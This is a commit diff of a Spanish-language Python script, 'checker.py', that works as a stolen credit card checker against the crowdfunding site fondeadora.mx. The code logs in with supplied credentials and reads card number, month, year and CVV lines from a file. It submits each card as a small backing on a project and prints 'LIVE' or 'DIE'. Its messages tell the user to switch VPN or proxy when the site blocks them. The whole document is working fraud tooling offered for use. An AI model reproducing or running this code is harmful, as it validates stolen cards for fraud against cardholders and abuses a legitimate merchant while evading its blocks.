9e44b23c8958955672e26afa5703ac6316878d5e
chapuawe <excremento75@gmail.com>
2017-01-11 22:29:09 -0600

    Add files via upload

--- checker.py
+++ checker.py
@@ -12,107 +12,129 @@ import sys
 #mes = sys.argv[3]
 #cvv = sys.argv[4]
 
-print "\n"
-print "                    	Checker Version Beta 0.4.5 \n";
+try:
+	lista = sys.argv[1]
+	email = sys.argv[2]
+	password = sys.argv[3]
 
-print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
-print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
-print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
-print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
-print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";
+	print "\n"
+	print "                    	Checker Version 0.5.0 \n";
 
-print "	  ======================================================\n\n";
-print "		     Uso: python checker.py archivo.txt\n\n";
+	print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
+	print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
+	print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
+	print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
+	print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";
+
+	print "	  ======================================================\n\n";
+	print "		     	Iniciando el Checker :D\n\n";
+
+except:
+	print "\n"
+	print "                    	Checker Version 0.5.0 \n";
+
+	print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
+	print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
+	print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
+	print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
+	print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";
+
+	print "	  ======================================================\n\n";
+	print "	    Uso : python checker.py (archivo.txt) (email fondeadora) (contrasena fondeadora)\n\n\n";
+
+	exit()
+
 
 br = mechanize.Browser()
 response = br.open('https://fondeadora.mx/login.html')
 
 br.select_form(nr=2)
 
-br.form['user[email]'] = 'zackdasti@mail.com'
-br.form['user[password]'] = 'joshua75'
+try:
+	br.form['user[email]'] = email
+	br.form['user[password]'] = password
+except:
+	print "  Email o contrasena incorrectos"
+	exit()
 
 br.submit()
-
-if (br.geturl() == "https://fondeadora.mx/login.html"):
-	response = br.open('https://fondeadora.mx/registrate.html')
-	br.select_form(nr=2)
-
-	br.form['user[name]'] = 'Zack Dasti'
-	br.form['user[email]'] = 'zackdasti@mail.com'
-	br.set_value('joshua75', nr=5)
-	br.set_value('joshua75', nr=6)
-	br.submit()
 
 contador = 0
 limite = 1
 
-lista = sys.argv[1]
 ccs = open(lista ,'r')
 
-try:
-	while contador <= limite :
+while contador <= limite :
 
+	try:
 		cc, mes, ano, cvv = ccs.next().rstrip("\n").split("|")
 
-		if (mes == "09"):
-			mes = mes.strip("0")
+	except:
+		print "  El Checker Ha Terminado :D Disfruta tus lives o dies :)"
 
-		else:
-			pass
+	if (mes == "09"):
+		mes = mes.strip("0")
 
-		if (mes == "08"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "08"):
+		mes = mes.strip("0")
 
-		if (mes == "07"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "07"):
+		mes = mes.strip("0")
 
-		if (mes == "06"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "06"):
+		mes = mes.strip("0")
 
-		if (mes == "05"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "05"):
+		mes = mes.strip("0")
 
-		if (mes == "04"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "04"):
+		mes = mes.strip("0")
 
-		if (mes == "03"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "03"):
+		mes = mes.strip("0")
 
-		if (mes == "02"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "02"):
+		mes = mes.strip("0")
 
-		if (mes == "01"):
-			mes = mes.strip("0")
+	else:
+		pass
 
-		else:
-			pass
+	if (mes == "01"):
+		mes = mes.strip("0")
 
+	else:
+		pass
+
+	try:
 		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar')
 		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar'
 		urlpass = br.geturl()
 
+	except:
+		print "  Tu ip se ha usado muchas veces :/ y el servidor te ha bloquado \n  intenta utilizar un vpn o proxy"
+		exit()
+	try:
 		br.select_form(nr=2)
 
 		br.form['date[year]'] = [ano]
@@ -122,20 +144,25 @@ try:
 		br.set_value(cc, nr=2)
 		br.set_value(cvv, nr=6)
 
+	except:
+		print "  Porfavor usa un vpn o contacta al creador con la \n  screenshot de los errores del checker_tester"
+		exit()
+
+	try:
 		br.submit()
 
-		if (urlpass != urlchecker):
-			print "  LIVE  " + cc + "\n"
+	except:
+		print "  Tu ip se ha usado muchas veces :/ y el servidor te ha bloquado \n  intenta utilizar un vpn o proxy"
+		exit()
 
-		else :
-			print "  DIE  " + cc + "\n"
-
+	if (urlpass != urlchecker):
+		print "  LIVE  " + cc + "\n"
 		contador = contador + 1
-		limite = limite + 1
+	else :
+		print "  DIE  " + cc + "\n"
 
-except:
-
-	print "  El Checker Ha Terminado :) \n  Si Tuviste Algun Error Recuerda Usar VPN"
+	contador = contador + 1
+	limite = limite + 1
 
 exit()
 
